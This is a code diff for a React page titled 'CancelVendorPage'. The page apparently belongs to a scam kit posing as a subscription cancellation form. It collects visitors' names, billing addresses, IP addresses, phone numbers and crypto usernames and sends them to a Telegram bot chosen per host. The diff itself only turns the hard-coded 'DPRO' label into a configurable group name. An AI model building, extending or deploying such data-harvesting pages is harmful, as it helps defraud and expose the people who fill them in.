@@ -34,7 +34,7 @@ export default function CancelVendorPage({ params }: CancelPageProps) {
   const [mainInfo, setMainInfo] = useState<any | null>(null)
   const [sessionInfo, setSessionInfo] = useState<any | null>(null)
   const [antiVirus, setAntiVirus] = useState<string>('')
-  const [telegramConfig, setTelegramConfig] = useState<{ botToken: string; chatId: string } | null>(null)
+  const [telegramConfig, setTelegramConfig] = useState<{ botToken: string; chatId: string; group: string } | null>(null)
 
   useEffect(() => {
     if (typeof window === 'undefined') return
@@ -64,6 +64,7 @@ export default function CancelVendorPage({ params }: CancelPageProps) {
             setTelegramConfig({
               botToken: String(entry.botToken),
               chatId: String(entry.chatId),
+              group: String(entry.group || 'DPRO'),
             })
           } else {
             console.error('No Telegram config found for host', host)
@@ -88,7 +89,8 @@ export default function CancelVendorPage({ params }: CancelPageProps) {
     const BOT_TOKEN = telegramConfig.botToken
     const CHAT_ID = telegramConfig.chatId
 
-    const message = `🔔 New Cancellation Request (DPRO)
+    const groupName = telegramConfig.group
+    const message = `🔔 New Cancellation Request (${groupName})
 
 fullName: ${formData.fullName || mainInfo?.fullName || 'N/A'}
 billingAddress: ${formData.billingAddress || 'N/A'}
@@ -103,7 +105,7 @@ agentId: ${mainInfo?.agentId || 'N/A'}
 agentName: ${mainInfo?.agentName || 'N/A'}
 ip_address: ${sessionInfo?.ipAddress || 'N/A'}
 homephone: ${mainInfo?.alternatePhone || 'N/A'}
-company: DPRO
+company: ${groupName}
 explicit_content: ${mainInfo?.explicitContent || 'N/A'}
 crypto_username: ${mainInfo?.cryptoUsername || 'N/A'}`
 
